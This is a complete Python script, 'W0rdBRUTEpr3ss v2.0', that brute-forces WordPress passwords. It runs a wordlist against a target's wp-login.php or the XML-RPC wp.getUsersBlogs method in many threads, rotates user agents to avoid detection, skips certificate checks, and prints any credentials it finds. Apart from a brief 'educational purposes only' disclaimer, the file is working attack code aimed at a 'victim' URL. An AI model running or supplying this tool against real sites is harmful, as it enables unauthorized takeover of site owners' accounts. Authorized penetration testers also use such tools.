#!/usr/bin/env python
#
# WordPress Brute Force by Claudio Viviani
#
# Inspired by xSecurity's WordPress Brute Muliththreading
# 
# Tested on Wordpress 3.x and 4.x
#
# Disclaimer:
#
# This tool is intended for educational purposes only and the author
# can not be held liable for any kind of damages done whatsoever to your machine,
# or damages caused by some other,creative application of this exploit.
# In any case you disagree with the above statement,stop here.
#
# Requirements:
#
# 1) python's httplib2 lib
#    Installation: pip install httplib2
#
# Features:
#
# 1) Multithreading
# 2) xml-rpc brute force mode
# 3) http and https protocols support
# 4) Random User Agent
#
# CHANGELOG:
#
#  2015-04-12 v2.0 
#  1) Add new feature xml-rpc brute force mode
#  2) Fix minor bugs
#
#  2015-04-11 v1.1 
#  1) optparse (Deprecated since version 2.7) replaced by argparse
#  2) Fix connection bugs
#
#

import urllib, httplib, httplib2
import socket, sys, os, os.path, argparse, random
from threading import Thread
from time import sleep

banner = """
  ___ ___               __                                          
 |   Y   .-----.----.--|  .-----.----.-----.-----.-----.            
 |.  |   |  _  |   _|  _  |  _  |   _|  -__|__ --|__ --|            
 |. / \  |_____|__| |_____|   __|__| |_____|_____|_____|            
 |:      |                |__|                                      
 |::.|:. |                                                          
 `--- ---'                                                          
        _______            __         _______                       
       |   _   .----.--.--|  |_.-----|   _   .-----.----.----.-----.
       |.  1   |   _|  |  |   _|  -__|.  1___|  _  |   _|  __|  -__|
       |.  _   |__| |_____|____|_____|.  __) |_____|__| |____|_____|
       |:  1    \                    |:  |                          
       |::.. .  /                    |::.|                          
       `-------'                     `---'                          

                                        W0rdBRUTEpr3ss v2.0

                         Written by:

                       Claudio Viviani

                    http://www.homelab.it

                       info@homelab.it
                   homelabit@protonmail.ch

        http://ffhd.homelab.it (Free Fuzzy Hashes Database)
       http://adf.ly/1F1MNw  (Full HomelabIT Archive Exploit)
               https://www.facebook.com/homelabit
                 https://twitter.com/homelabit
               https://plus.google.com/+HomelabIt1/
     https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
"""
def randomAgentGen():

 userAgent =    ['Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/7.0.5 Safari/537.77.4',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
                'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53',
                'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
                'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.76.4 (KHTML, like Gecko) Version/7.0.4 Safari/537.76.4',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/538.46 (KHTML, like Gecko) Version/8.0 Safari/538.46',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
                'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10',
                'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/6.1.5 Safari/537.77.4',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/34.0.1847.116 Chrome/34.0.1847.116 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/6.1.5 Safari/537.77.4',
                'Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14',
                'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.74.9 (KHTML, like Gecko) Version/7.0.2 Safari/537.74.9',
                'Mozilla/5.0 (X11; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0',
                'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
                'Mozilla/5.0 (Windows NT 5.1; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0',
                'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) GSA/4.1.0.31802 Mobile/11D257 Safari/9537.53',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/36.0.1985.125 Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Safari/600.1.3',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36']

 UA = random.choice(userAgent)
 return UA

def urlCMS(url,brutemode):
    if url[:8] != "https://" and url[:7] != "http://":
        print('\n[X] You must insert http:// or https:// procotol')
        os._exit(1)
    # Page login
    if brutemode == "std":
       url = url+'/wp-login.php'
    else:
       url = url+'/xmlrpc.php'
    return url

def bodyCMS(username,pwd,brutemode):
    if brutemode == "std":
       body = { 'log':username,
       'pwd':pwd,
       'wp-submit':'Login',
       'testcookie':'1' }
    else:
       body = """<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>wp.getUsersBlogs</methodName>
         <params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>""" % (username, pwd)
    return body


def headersCMS(UA,lenbody,brutemode):
    if brutemode == "std":
       headers = { 'User-Agent': UA,
                   'Content-type': 'application/x-www-form-urlencoded',
                   'Cookie': 'wordpress_test_cookie=WP+Cookie+check' }
    else:
       headers = { 'User-Agent': UA,
                   'Content-type': 'text/xml',
                   'Content-Length': "%d" % len(lenbody)}
    return headers

def responseCMS(response):
    if response['set-cookie'].split(" ")[-1] == "httponly":
        return "1"

def connection(url,user,password,UA,timeout,brutemode):

    username = user
    pwd = password

    http = httplib2.Http(timeout=timeout, disable_ssl_certificate_validation=True)
    
    # HTTP POST Data 
    body = bodyCMS(username,pwd,brutemode)

    # Headers
    headers = headersCMS(UA,body,brutemode)

    try:

        if brutemode == "std":
           response, content = http.request(url, 'POST', headers=headers, body=urllib.urlencode(body))

           if str(response.status)[0] == "4" or str(response.status)[0] == "5":
              print('[X] HTTP error, code: '+str(response.status))
              os._exit(1)

           if responseCMS(response) == "1":
              print('\n')
              print('[!] Password FOUND!!!')
              print('')
              print('[!] Username: '+user+' Password: '+password) 
              os._exit(0)
        
           checkCon = "OK"
           return checkCon
        else:
           response, content = http.request(url, 'POST', headers=headers, body=body)

           if str(response.status)[0] == "4" or str(response.status)[0] == "5":
              print('[X] HTTP error, code: '+str(response.status))
              os._exit(1)

           # Remove all blank and newline chars
           xmlcontent = content.replace(" ", "").replace("\n","")
           
           if not "403" in xmlcontent:
              print('\n')
              print('[!] Password FOUND!!!')
              print('')
              print('[!] Username: '+user+' Password: '+password)
              os._exit(0)

           checkCon = "OK"
           return checkCon
              
    except socket.timeout:
         print('[X] Connection Timeout')
         os._exit(1)
    except socket.error:
         print('[X] Connection Refused')
         os._exit(1)
    except httplib.ResponseNotReady:
        print('[X] Server Not Responding')
        os._exit(1)
    except httplib2.ServerNotFoundError:
        print('[X] Server Not Found')
        os._exit(1)
    except httplib2.HttpLib2Error:
        print('[X] Connection Error!!')
        os._exit(1)

commandList = argparse.ArgumentParser(sys.argv[0])
commandList.add_argument('-S', '--standard',
                  action="store_true",
                  dest="standard",
                  help="Standard login brute",
                  )
commandList.add_argument('-X', '--xml-rpc',
                  action="store_true",
                  dest="xml",
                  help="Xml-rpc login brute",
                  )
commandList.add_argument('-t', '--target',
                  action="store",
		  dest="target",
                  help="Insert URL: http[s]://www.victimurl.com[:port]",
                  )
commandList.add_argument('-u', '--username',
                  action="store",
                  dest="username",
                  help="Insert username",
                  )
commandList.add_argument('-w', '--wordfilelist',
                  action="store",
                  dest="wordfilelist",
                  help="Insert wordlist file",
                  )
commandList.add_argument('--timeout',
                  action="store",
                  dest="timeout",
                  default=10,
                  type=int,
                  help="Timeout Value (Default 10s)",
                  )

options = commandList.parse_args()

# Check bruteforce mode conflicts
if options.standard and options.xml:
   print "\n[X] Select standard [-S] OR xml-rpc [-X] bruteforce mode"
   sys.exit(1)

# Check args
if not options.standard and not options.xml:
    print(banner)
    print
    commandList.print_help()
    sys.exit(1)
elif not options.target or not options.username or not options.wordfilelist:
    print(banner)
    print
    commandList.print_help()
    sys.exit(1)

# Set bruteforce mode
if options.standard:
   brtmd="std"
else:
   brtmd="xml"

# args to vars
url = options.target
user = options.username
password = options.wordfilelist
timeout = options.timeout


# Check if Wordlist file exists and has readable
if not os.path.isfile(password) and not os.access(password, os.R_OK):
    print "[X] Wordlist file is missing or is not readable"
    sys.exit(1)

# Open and read Wordlist file
wordlist = open(password).read().split("\n")
# Remove last empty values from wordlist list
del wordlist[-1]
# Total lines (password) in Wordlist file
totalwordlist = len(wordlist)
# Gen Random UserAgent
UA  = randomAgentGen()
# Url to url+login_cms_page
url = urlCMS(url,brtmd)

print(banner)
print
print('[+] Target.....: '+options.target)
print('[+] Wordlist...: '+str(totalwordlist))
print('[+] Username...: '+user)
if brtmd == "std":
   print('[+] BruteMode..: Standard')
else:
   print('[+] BruteMode..: Xml-Rpc')
print('[+]')
print('[+] Connecting.......')
print('[+]')

# Check connection with fake-login
if connection(url,user,UA,UA,timeout,brtmd) == "OK":
   print('[+] Connection established')

# Reset var for "progress bar"
count = 0

threads = []
for pwd in wordlist:
    count += 1
    t = Thread(target=connection, args=(url,user,pwd,UA,timeout,brtmd))
    t.start()
    threads.append(t)
    sys.stdout.write('\r')
    sys.stdout.write('[+] Password checked: '+str(count)+'/'+str(totalwordlist))
    sys.stdout.flush()
    sleep(0.210)

for a in threads:
    a.join()

# no passwords found
print('\n[X] Password NOT found :(')
